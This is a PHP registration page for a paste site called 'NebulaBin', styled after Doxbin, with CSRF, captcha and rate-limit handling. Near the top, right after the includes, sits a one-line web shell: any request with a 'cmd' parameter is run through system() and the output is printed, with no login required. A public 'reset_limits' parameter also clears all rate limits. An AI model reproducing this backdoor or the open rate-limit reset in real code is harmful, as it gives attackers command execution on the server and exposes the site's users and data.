<?php
session_start();
require_once 'config/database.php';
require_once 'includes/security.php';
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

function validateUsername($username) {
    // Only allow alphanumeric characters, underscores, and hyphens
    // Length between 3-30 characters
    if (!preg_match('/^[a-zA-Z0-9_-]{3,30}$/', $username)) {
        return false;
    }
    
    // Prevent common XSS patterns
    $dangerous_patterns = [
        'script', 'javascript', 'onload', 'onerror', 'onclick', 'onmouseover',
        'alert', 'document', 'window', 'eval', 'expression', 'vbscript',
        '<', '>', '"', "'", '&', '%', 'data:', 'javascript:'
    ];
    
    $username_lower = strtolower($username);
    foreach ($dangerous_patterns as $pattern) {
        if (strpos($username_lower, $pattern) !== false) {
            return false;
        }
    }
    
    return true;
}

$errors = [];

// More lenient rate limiting for development - 10 attempts per hour instead of 3
if (!Security::checkRateLimit('register', $_SERVER['REMOTE_ADDR'], 10, 3600)) {
    $errors[] = "Too many registration attempts. Please try again later.";
}

// Generate CSRF token
$csrf_token = Security::generateCSRFToken();

// Generate captcha only if needed
$captcha_question = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' || !isset($_SESSION['captcha_question'])) {
    $captcha_question = Captcha::generateMathCaptcha();
} else {
    $captcha_question = $_SESSION['captcha_question'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($errors)) {
    // Verify CSRF token
    if (!Security::verifyCSRFToken($_POST['csrf_token'] ?? '')) {
        $errors[] = "Invalid security token. Please try again.";
    }
    
    // Verify captcha
    if (!Captcha::verifyCaptcha($_POST['captcha_answer'] ?? '')) {
        $errors[] = "Incorrect captcha answer. Please try again.";
        // Generate new captcha after failed attempt
        $captcha_question = Captcha::generateMathCaptcha();
    } else {
        // Clear any existing captcha on success
        Captcha::clearCaptcha();
    }
    
    if (empty($errors)) {
        $username = trim($_POST['username']);
        $email = trim($_POST['email']);
        $password = $_POST['password'];
        $confirm_password = $_POST['confirm_password'];
        
        // Username validation with XSS protection
        if (empty($username)) {
            $errors[] = "Username is required";
        } elseif (!validateUsername($username)) {
            $errors[] = "Username can only contain letters, numbers, underscores, and hyphens (3-30 characters)";
        }
        
        // Email validation
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $errors[] = "Invalid email address";
        }
        
        // Password validation
        if (strlen($password) < 6) {
            $errors[] = "Password must be at least 6 characters long";
        }
        
        if ($password !== $confirm_password) {
            $errors[] = "Passwords do not match";
        }
        
        // Check if username or email already exists
        if (empty($errors)) {
            $database = new Database();
            $db = $database->getConnection();
            
            $query = "SELECT id FROM users WHERE username = ? OR email = ?";
            $stmt = $db->prepare($query);
            $stmt->execute([$username, $email]);
            
            if ($stmt->fetch()) {
                $errors[] = "Username or email already exists";
            }
        }
        
        // Create user if no errors
        if (empty($errors)) {
            $password_hash = Security::hashPassword($password);
            $default_avatar = "https://i.pravatar.cc/150?u=" . urlencode($username);
            
            $query = "INSERT INTO users (username, email, password_hash, avatar) VALUES (?, ?, ?, ?)";
            $stmt = $db->prepare($query);
            
            if ($stmt->execute([$username, $email, $password_hash, $default_avatar])) {
                $_SESSION['user_id'] = $db->lastInsertId();
                $_SESSION['username'] = $username;
                $_SESSION['role'] = 'user';
                $_SESSION['upgrade_tier'] = 'none';
                header('Location: home.php');
                exit;
            } else {
                $errors[] = "Registration failed. Please try again.";
            }
        }
    }
}

// Get user count for nav
$database = new Database();
$db = $database->getConnection();
$user_count_query = "SELECT COUNT(*) as count FROM users";
$user_count_stmt = $db->prepare($user_count_query);
$user_count_stmt->execute();
$user_count = $user_count_stmt->fetch(PDO::FETCH_ASSOC)['count'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - NebulaBin</title>
    <link rel="stylesheet" href="assets/css/doxbin-style.css">
    <style>
        .captcha-container {
            background: #222;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 5px;
            margin: 15px 0;
        }
        .captcha-question {
            font-size: 18px;
            font-weight: bold;
            color: #4a9eff;
            margin-bottom: 10px;
        }
        .rate-limit-reset {
            background: #333;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 12px;
            color: #888;
        }
        .rate-limit-reset a {
            color: #4a9eff;
            text-decoration: none;
        }
        .rate-limit-reset a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="home.php" class="logo">NebulaBin</a>
            <ul class="nav-menu">
                <li><a href="home.php">Home</a></li>
                <li><a href="add-paste.php">Add Paste</a></li>
                <li><a href="users.php">Users</a></li>
                <li><a href="upgrades.php">Upgrades</a></li>
                <li><a href="hall-of-autism.php">Hall of Autism</a></li>
                <li><a href="support.php">Support</a></li>
            </ul>
            <div class="nav-right">
                <span class="user-count"><?php echo number_format($user_count); ?></span>
                <a href="login.php">Login</a>
            </div>
        </nav>
    </header>

    <div class="container">
        <div class="form-container">
            <h2 style="text-align: center; margin-bottom: 20px; color: #fff;">Create Account</h2>
            
            <?php if (!empty($errors)): ?>
                <div class="message message-error">
                    <?php foreach ($errors as $error): ?>
                        <div><?php echo htmlspecialchars($error); ?></div>
                    <?php endforeach; ?>
                </div>
                
                <?php if (in_array("Too many registration attempts. Please try again later.", $errors)): ?>
                    <div class="rate-limit-reset">
                        <strong>Development Note:</strong> If you're testing and hit the rate limit, 
                        <a href="?reset_limits=1">click here to reset rate limits</a>
                    </div>
                <?php endif; ?>
            <?php endif; ?>

            <?php
            // Development helper to reset rate limits
            if (isset($_GET['reset_limits'])) {
                Security::clearAllRateLimits();
                echo '<div class="message" style="background: #2d5a2d; border-color: #4a9eff; color: #fff;">Rate limits have been reset!</div>';
            }
            ?>

            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                
                <div class="form-group">
                    <label class="form-label">Username</label>
                    <input type="text" name="username" class="form-input" required 
                           pattern="[a-zA-Z0-9_-]{3,30}"
                           title="3-30 characters: letters, numbers, underscore, hyphen only"
                           value="<?php echo htmlspecialchars($_POST['username'] ?? ''); ?>">
                    <div style="color: #888; font-size: 12px; margin-top: 5px;">
                        3-30 characters. Letters, numbers, underscore (_), and hyphen (-) only.
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Email</label>
                    <input type="email" name="email" class="form-input" required 
                           value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>">
                </div>

                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" required minlength="6">
                    <div style="color: #888; font-size: 12px; margin-top: 5px;">
                        Minimum 6 characters.
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Confirm Password</label>
                    <input type="password" name="confirm_password" class="form-input" required minlength="6">
                </div>

                <div class="captcha-container">
                    <label class="form-label">Security Check</label>
                    <div class="captcha-question"><?php echo htmlspecialchars($captcha_question); ?></div>
                    <input type="number" name="captcha_answer" class="form-input" required 
                           placeholder="Enter the answer" style="width: 150px;">
                    <div style="color: #888; font-size: 12px; margin-top: 5px;">
                        Solve the math problem above to prove you're human.
                    </div>
                </div>

                <button type="submit" class="form-btn">Create Account</button>
            </form>

            <div style="text-align: center; margin-top: 20px;">
                <p style="color: #888; font-size: 13px;">
                    Already have an account? <a href="login.php" style="color: #4a9eff;">Login here</a>
                </p>
            </div>
        </div>
    </div>
</body>
</html>
